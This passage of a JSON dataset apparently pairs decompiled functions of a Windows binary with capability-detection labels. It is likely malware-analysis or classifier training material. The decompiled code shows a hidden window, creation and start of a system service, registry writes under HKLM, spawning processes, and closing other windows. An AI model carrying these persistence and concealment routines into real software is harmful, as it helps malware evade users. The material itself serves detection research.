        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040253b) overlaps instruction at (ram,0x00402538)\n// \n\nuint __fastcall fcn.004024a0(uint param_1, ushort param_2)\n\n{\n    uchar uVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    int16_t iVar4;\n    uint8_t *in_EAX;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uchar *unaff_EDI;\n    uint *puVar8;\n    \n    puVar7 = &stack0xfffffffc;\n    puVar6 = &stack0xfffffffc;\n    if ((!SBORROW4(&stack0xfffffffc, 0x108)) && (puVar6 = &stack0xfffffffc,  SBORROW4(&stack0xfffffffc, 0x108))) {\n        puVar8 = unaff_EDI + 1;\n        uVar1 = in(param_2);\n        *unaff_EDI = uVar1;\n        if (0x107 < &stack0xfffffffc && *0x10 != 0x10c) {\n            uVar2 = *in_EAX;\n            *in_EAX = *in_EAX + param_2;\n            iVar4 = in_EAX + 0x60f1 + CARRY1(uVar2, param_2);\n            goto code_r0x0040250c;\n        }\n        puVar6 = &stack0xfffffffd;\n    }\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (*(puVar6 + 0xc) != *(puVar6 + -4)) {\n        return 1;\n    }\n    iVar4 = 0;\n    puVar6[-0x108] = 0;\n    puVar8 = puVar6 + -0x107;\n    for (iVar5 = 0x40; puVar7 = puVar6,  iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\ncode_r0x0040250c:\n    *puVar8 = iVar4;\n    *(puVar8 + 2) = iVar4;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    iVar5 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar7 + -0x108, 0x4073d4);\n    if (iVar5 == 0) {\n        uVar3 = *(puVar7 + 8);\n        (*_sym.imp.USER32.dll_EnumChildWindows)(uVar3, 0x402420, 0);\n        iVar5 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar5 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(uVar3, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 671
    },
    "004025c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004026a4) overlaps instruction at (ram,0x004026a2)\n// \n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00402703)\n// WARNING: Removing unreachable block (ram,0x0040268f)\n// WARNING: Removing unreachable block (ram,0x00402695)\n// WARNING: Removing unreachable block (ram,0x00402696)\n// WARNING: Removing unreachable block (ram,0x0040269e)\n// WARNING: Removing unreachable block (ram,0x0040277e)\n// WARNING: Removing unreachable block (ram,0x00402665)\n\nint32_t fcn.004025c0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint8_t extraout_CL;\n    char extraout_CH;\n    int32_t extraout_ECX;\n    int32_t iVar3;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint uVar4;\n    uint16_t uVar5;\n    int32_t extraout_EDX;\n    uchar uVar6;\n    uint8_t uVar8;\n    uint32_t unaff_EBX;\n    uint32_t uVar7;\n    uchar *puVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uchar *puVar12;\n    uint *puVar13;\n    uchar *puVar14;\n    uint32_t *puVar15;\n    uchar *puVar16;\n    uint *puVar17;\n    uchar *puVar18;\n    int32_t iVar19;\n    uint *unaff_ESI;\n    code *pcVar20;\n    uint uVar21;\n    uint *unaff_EDI;\n    uint *puVar22;\n    uint *puVar23;\n    ushort in_SS;\n    ushort in_DS;\n    bool bVar24;\n    bool bVar25;\n    char cVar26;\n    bool bVar27;\n    char cVar28;\n    unkbyte10 extraout_ST0;\n    ulong uVar29;\n    uint var_25fh;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    bVar24 = false;\n    bVar27 = false;\n    bVar25 = (unaff_EBX & 0x4d) == 0;\n    fcn.00404410();\n    if ((!bVar24 && !bVar25) && (bVar24 || bVar25)) {\n        if (!bVar27) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(extraout_EDX + 0x10) = *(extraout_EDX + 0x10) + extraout_CH;\n        (*_sym.imp.USER32.dll_PostMessageA)(unaff_ESI);\n        return 0;\n    }\n    iVar2 = fcn.00401d80();\n    bVar24 = iVar2 == 0;\n    if (!bVar24) {\n        if ((bVar24) || (uVar7 = unaff_EBX & 0xffff00ff,  iVar3 = extraout_ECX,  !bVar24)) {\n            uVar7 = 0;\n            iVar3 = 0x40;\n        }\n        *unaff_EDI = *unaff_ESI;\n        uVar6 = uVar7;\n        uVar7 = uVar7 & 0xffff0000 | CONCAT11(0xdf, uVar6);\n        iVar19 = 0x33e181d0;\n        *(iVar3 + 0x40) = extraout_ST0;\n        *0x33e17f70 = uVar6;\n        *(iVar2 + -4) = uVar7;\n        puVar22 = 0x33e17f71;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar22 = 0;\n            puVar22 = puVar22 + 1;\n        }\n        *puVar22 = 0;\n        *(puVar22 + 2) = 0;\n        *(iVar2 + -8) = 0x26;\n        *(iVar2 + -0xc) = 0x33e17f70;\n        *(iVar2 + -0x10) = uVar7;\n        pcVar20 = _sym.imp.SHELL32.dll_SHGetSpecialFolderPathA;\n        puVar9 = iVar2 + -0x14;\n        *(iVar2 + -0x14) = 0x40264a;\n        iVar2 = (*pcVar20)();\n        if (iVar2 != 0) {\n            *(puVar9 + -4) = unaff_ESI + 1;\n            pcVar20 = *(puVar9 + -4);\n            *(puVar9 + -4) = 0x402675;\n            fcn.00402970();\n            puVar22 = 0x33e18075;\n            *0x33e18074 = uVar6;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar22 = 0;\n                puVar22 = puVar22 + 1;\n            }\n            *puVar22 = 0;\n            *(puVar22 + 2) = 0;\n            *(puVar9 + -4) = 3;\n    // WARNING: Could not recover jumptable at 0x004026ab. Too many branches\n    // WARNING: Treating indirect jump as call\n            *(puVar9 + -8) = 0x40738c;\n            *(puVar9 + -0xc) = 0x33e17f70;\n            *(puVar9 + -0x10) = 0x4073ac;\n            *(puVar9 + -0x14) = 0x33e18074;\n            pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n            puVar10 = puVar9 + -0x18;\n            *(puVar9 + -0x18) = 0x4026c4;\n            (*pcVar1)();\n            puVar11 = puVar10 + 0x14;\n            *0x33e181bc = uVar7;\n            while( true ) {\n                puVar22 = iVar19 + -0x58;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar22 = 0;\n                    puVar22 = puVar22 + 1;\n                }\n                *(iVar19 + -0x10) = 0;\n                *(iVar19 + -0x58) = 0x44;\n                *(iVar19 + -0xc) = 0;\n                *(iVar19 + -0x2c) = 1;\n                *(iVar19 + -8) = 0;\n                *(iVar19 + -0x28) = uVar7;\n                *(iVar19 + -4) = 0;\n                *(puVar11 + -4) = pcVar20;\n                uVar21 = *(puVar11 + -4);\n                *(puVar11 + -4) = iVar19 + -0x10;\n                *(puVar11 + -8) = iVar19 + -0x58;\n                *(puVar11 + -0xc) = uVar7;\n                *(puVar11 + -0x10) = uVar7;\n                *(puVar11 + -0x14) = uVar7;\n                *(puVar11 + -0x18) = uVar7;\n                *(puVar11 + -0x1c) = uVar7;\n                *(puVar11 + -0x20) = uVar7;\n                *(puVar11 + -0x24) = iVar19 + -0x15c;\n                *(puVar11 + -0x28) = uVar7;\n                pcVar20 = _sym.imp.KERNEL32.dll_CreateProcessA;\n                puVar12 = puVar11 + -0x2c;\n                *(puVar11 + -0x2c) = 0x40272c;\n                iVar2 = (*pcVar20)();\n                cVar28 = '\\0';\n                cVar26 = iVar2 < 0;\n                if (iVar2 == 0) break;\n                if ((cVar26) || (!cVar26)) {\n                    *(puVar12 + -4) = 3000;\n                    pcVar20 = _sym.imp.KERNEL32.dll_Sleep;\n                    puVar13 = puVar12 + -8;\n                    puVar12 = puVar12 + -8;\n                    *puVar13 = 0x40274d;\n                    (*pcVar20)();\n                }\n                else {\n                    uVar8 = uVar7 >> 8;\n                    uVar7 = uVar7 & 0xffff0000 | CONCAT11(uVar8 * '\\x02', uVar7);\n                    cVar28 = SCARRY4(iVar2 + 0xbb868, 0x40607c) != SCARRY4(iVar2 + 0x4c18e4, CARRY1(uVar8, uVar8));\n                    cVar26 = iVar2 + 0x4c18e4 + CARRY1(uVar8, uVar8) < 0;\n                }\n                *(puVar12 + -4) = *(iVar19 + -8);\n                *(puVar12 + -8) = fcn.004024a0;\n                pcVar20 = _sym.imp.USER32.dll_EnumWindows;\n                puVar14 = puVar12 + -0xc;\n                *(puVar12 + -0xc) = 0x40275c;\n                uVar29 = (*pcVar20)();\n                puVar23 = puVar22;\n                if (cVar28 == cVar26) {\n                    *(puVar14 + -2) = uVar29 >> 0x20;\n                    uVar5 = *(puVar14 + -2);\n                    if (cVar28 != cVar26) {\n                        out(0xc4, uVar29);\n                        *(puVar14 + -4) = in_DS;\n                        *(puVar14 + -8) = in_SS;\n                        puVar23 = puVar22 + 1;\n                        *puVar22 = uVar29;\n                        puVar15 = puVar14 + -0xc;\n                        puVar14 = puVar14 + -0xc;\n                        *puVar15 = uVar29 >> 0x20 & 0xffff0000 | uVar5 & 0xffffff00 | uVar5 ^ extraout_CL;\n                    }\n                }\n                uVar4 = *(iVar19 + -0x10);\n                *(puVar14 + -4) = 1000;\n                *(puVar14 + -8) = uVar4;\n                pcVar20 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n                puVar16 = puVar14 + -0xc;\n                *(puVar14 + -0xc) = 0x40278c;\n                uVar29 = (*pcVar20)();\n                uVar4 = extraout_ECX_00;\n                if (uVar29 == 0x102) {\n                    uVar4 = *(iVar19 + -0x10);\n                    *(puVar16 + -4) = 1;\n                    *(puVar16 + -8) = uVar4;\n                    pcVar20 = _sym.imp.KERNEL32.dll_TerminateProcess;\n                    puVar17 = puVar16 + -0xc;\n                    puVar16 = puVar16 + -0xc;\n                    *puVar17 = 0x40279f;\n                    uVar29 = (*pcVar20)();\n                    uVar4 = extraout_ECX_01;\n                }\n                *(puVar16 + -4) = uVar29;\n                *(puVar16 + -8) = uVar4;\n                *(puVar16 + -0xc) = uVar29 >> 0x20;\n                *(puVar16 + -0x10) = uVar7;\n                *(puVar16 + -0x14) = puVar16;\n                *(puVar16 + -0x18) = iVar19;\n                *(puVar16 + -0x1c) = uVar21;\n                *(puVar16 + -0x20) = puVar23;\n                pcVar20 = _sym.imp.KERNEL32.dll_CloseHandle;\n                iVar19 = *(puVar16 + -0x18);\n                *(puVar16 + -4) = *(iVar19 + -0xc);\n                puVar18 = puVar16 + -8;\n                *(puVar16 + -8) = 0x4027be;\n                (*pcVar20)();\n                *(puVar18 + -4) = *(iVar19 + -0x10);\n                puVar11 = puVar18 + -8;\n                *(puVar18 + -8) = 0x4027c4;\n                (*pcVar20)();\n                iVar2 = *(iVar19 + -0x14) + 1;\n                *(iVar19 + -0x14) = iVar2;\n                if (0 < iVar2) {\n                    return iVar2;\n                }\n                uVar7 = 0;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 2972
    },
    "00402940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402940(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402b90(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00402970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402970(void)\n\n{\n    uint uVar1;\n    \n    if (*0x425738 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x425738 = 1;\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00402d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d4e) overlaps instruction at (ram,0x00402d45)\n// \n\nchar * __cdecl fcn.00402d20(char *arg_8h, uint32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    bVar5 = CARRY4(arg_8h - arg_14h, arg_ch);\n    if (((!bVar5) && (bVar5)) || (bVar5 = false,  arg_14h != 0)) {\n        pcVar1 = arg_8h + (bVar5 == false) + 0x7c8ecb0d;\n        *(arg_ch + 0x43d1773a) = *(arg_ch + 0x43d1773a) ^ 0x8527e95e;\n        for (; pcVar1 <= (arg_8h - arg_14h) + arg_ch; pcVar1 = pcVar1 + 1) {\n            if (*pcVar1 == *arg_10h) {\n                iVar2 = arg_14h + -1;\n                bVar5 = true;\n                pcVar3 = pcVar1;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    if (iVar2 == 0) break;\n                    iVar2 = iVar2 + -1;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return pcVar1;\n                }\n            }\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 422
    },
    "004035f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004035f0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004038c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403924) overlaps instruction at (ram,0x00403923)\n// \n// WARNING: Removing unreachable block (ram,0x004039f7)\n// WARNING: Removing unreachable block (ram,0x00403a04)\n// WARNING: Removing unreachable block (ram,0x004039b5)\n// WARNING: Removing unreachable block (ram,0x00403912)\n// WARNING: Removing unreachable block (ram,0x00403914)\n// WARNING: Removing unreachable block (ram,0x00403984)\n// WARNING: Removing unreachable block (ram,0x00403986)\n// WARNING: Removing unreachable block (ram,0x00403924)\n\nbool fcn.004038c0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    char extraout_DL;\n    uint *unaff_EDI;\n    uint *puVar3;\n    bool bVar4;\n    char cVar5;\n    char cVar6;\n    uchar uStack132;\n    uint uStack131;\n    uchar uStack100;\n    uint uStack99;\n    uchar uStack68;\n    uint uStack67;\n    uchar uStack36;\n    uint uStack35;\n    \n    iVar1 = fcn.00403830();\n    if (iVar1 == 0) {\n        return false;\n    }\n    cVar5 = iVar1 >> 8;\n    cVar6 = SBORROW1(extraout_DL + '\\x15', cVar5);\n    cVar5 = (extraout_DL + '\\x15') - cVar5 < '\\0';\n    uVar2 = fcn.00401a00();\n    if ((cVar6 == cVar5) && (cVar6 != cVar5)) {\n        out(0xc4, uVar2);\n        *unaff_EDI = uVar2;\n    }\n    iVar1 = fcn.004027f0(0x407074);\n    // WARNING: Bad instruction - Truncating control flow here\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00404020();\n    *0x425740 = 1;\n    iVar1 = fcn.00402fc0();\n    bVar4 = iVar1 != 0;\n    if (bVar4) {\n        return false;\n    }\n    if ((bVar4) && (!bVar4)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uStack36 = 0;\n    uStack132 = 0;\n    puVar3 = &uStack35;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uStack68 = 0;\n    puVar3 = &uStack131;\n    uStack100 = uStack68;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    puVar3 = &uStack99;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    puVar3 = &uStack67;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar1 = fcn.004046b0(&uStack132, &uStack100, &uStack36, &uStack68);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00403310(&uStack36);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00401350(&uStack132, &uStack100, &uStack36, &uStack68);\n            return iVar1 != 0;\n        }\n        return false;\n    }\n    return false;\n}\n",
        "token_count": 1021
    },
    "004049f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a45) overlaps instruction at (ram,0x00404a44)\n// \n// WARNING: Removing unreachable block (ram,0x00404a1e)\n\nvoid __cdecl fcn.004049f0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint uVar2;\n    int32_t unaff_EBX;\n    uint *puVar3;\n    bool bVar4;\n    ulong uVar5;\n    uint uVar6;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    bVar4 = true;\n    var_4h = 0;\n    var_68h = 0;\n    puVar3 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    uVar5 = fcn.00404800(&var_68h, &var_4h);\n    if ((bVar4) || (!bVar4)) {\n        uVar6 = 0xa280;\n        uVar2 = var_4h;\n    }\n    else {\n        *(unaff_EBX + -0x7f9703ab) = *(unaff_EBX + -0x7f9703ab) | 0xffffffa2;\n        *uVar5 = *uVar5 + uVar5;\n        uVar2 = uVar5 >> 0x20;\n        uVar6 = extraout_ECX;\n    }\n    fcn.00403160(&var_68h, uVar2, 0x4074a0, uVar6);\n    *arg_8h = 0x4074a0;\n    *arg_ch = 0xa280;\n    return;\n}\n",
        "token_count": 455
    },
    "00404cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404d7f) overlaps instruction at (ram,0x00404d7d)\n// \n// WARNING: Removing unreachable block (ram,0x00404e0a)\n// WARNING: Removing unreachable block (ram,0x00404d06)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404cc0(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint32_t in_EAX;\n    uint16_t in_DX;\n    uint unaff_EBX;\n    uchar *puVar1;\n    bool bVar2;\n    bool bVar3;\n    \n    *arg_8h = 0x1f;\n    arg_8h[1] = 0x24;\n    arg_8h[2] = 0x9e;\n    bVar2 = (in_DX ^ unaff_EBX >> 8 | 0x67) != 0;\n    arg_8h[3] = 0xc4;\n    puVar1 = arg_8h;\n    if ((bVar2) && (!bVar2)) {\n        in_EAX = in_EAX & 0xffffff00 | *0x4bb148d3;\n        puVar1 = arg_8h + 1;\n        out(*arg_8h, in_DX);\n    }\n    puVar1[4] = 5;\n    bVar2 = false;\n    bVar3 = (in_DX & 0x1200) != 0;\n    arg_8h[5] = 0xd6;\n    if ((bVar3) && (!bVar3)) {\n        in_EAX = in_EAX & 0xe2f4cc58;\n        bVar2 = in_EAX < 0;\n    }\n    arg_8h[6] = 0x94;\n    if (!bVar2) {\n        if (bVar2) {\n            arg_8h = in_EAX + 1;\n            goto code_r0x00404d83;\n        }\n    }\n    arg_8h[7] = 0xf8;\ncode_r0x00404d83:\n    arg_8h[8] = 0x66;\n    arg_8h[9] = 0;\n    arg_8h[10] = 0x76;\n    arg_8h[0xb] = 0x76;\n    arg_8h[0xc] = 0xc1;\n    arg_8h[0xd] = 0xaf;\n    arg_8h[0xe] = 0x69;\n    *arg_ch = 0xf;\n    return;\n}\n",
        "token_count": 602
    },
    "00403700": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403700(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "004028e0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004028e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x40749c, 0x425734, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 139
    },
    "004031e0": {
        "rules": [
            "contain loop",
            "contain pusha popa sequence"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032db) overlaps instruction at (ram,0x004032da)\n// \n// WARNING: Removing unreachable block (ram,0x004032db)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004031e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t *unaff_EDI;\n    int32_t *piVar3;\n    int32_t in_stack_00000014;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        do {\n            uVar1 = *(var_ch % arg_ch + arg_8h);\n            piVar3 = unaff_EDI ^ *(unaff_EDI + 0xe58be73);\n            uVar2 = var_10h ^ *(var_8h + arg_10h) ^ *((var_ch + -1) % arg_ch + arg_8h);\n            *(in_stack_00000014 + -1 + var_ch) = uVar2;\n            unaff_EDI = piVar3;\n            if (-1 < uVar2) {\n                if (-1 >= uVar2) {\n                    out(0xc4, in_stack_00000014);\n                    unaff_EDI = piVar3 + 1;\n                    *piVar3 = in_stack_00000014;\n                }\n            }\n            *(var_ch + in_stack_00000014) = var_10h ^ uVar1;\n            var_8h = var_8h + 1;\n            var_ch = var_ch + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 491
    },
    "00401730": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401730(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 80
    },
    "00401970": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401970(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 242
    },
    "00404f70": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404fc3)\n\nuint __cdecl fcn.00404f70(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar **ppuVar4;\n    uchar **ppuVar5;\n    bool in_ZF;\n    uchar *apuStack12 [2];\n    \n    puVar3 = &stack0xfffffffc;\n    ppuVar5 = &stack0xfffffffc;\n    if ((!in_ZF) && (ppuVar5 = &stack0xfffffffc,  in_ZF)) {\n        ppuVar4 = apuStack12 + 1;\n        ppuVar5 = apuStack12 + 1;\n        apuStack12[1] = &stack0xfffffffc;\n        cVar1 = '\\x10';\n        do {\n            puVar3 = puVar3 + -1;\n            ppuVar4 = ppuVar4 + -1;\n            *ppuVar4 = *puVar3;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)\n                      (*(ppuVar5 + 8), *(ppuVar5 + 0xc), *(ppuVar5 + 0xc), 0xf01ff, 1, 0, 1, *(ppuVar5 + 0x10), 0, 0, 0\n                       , 0, 0);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 394
    }
}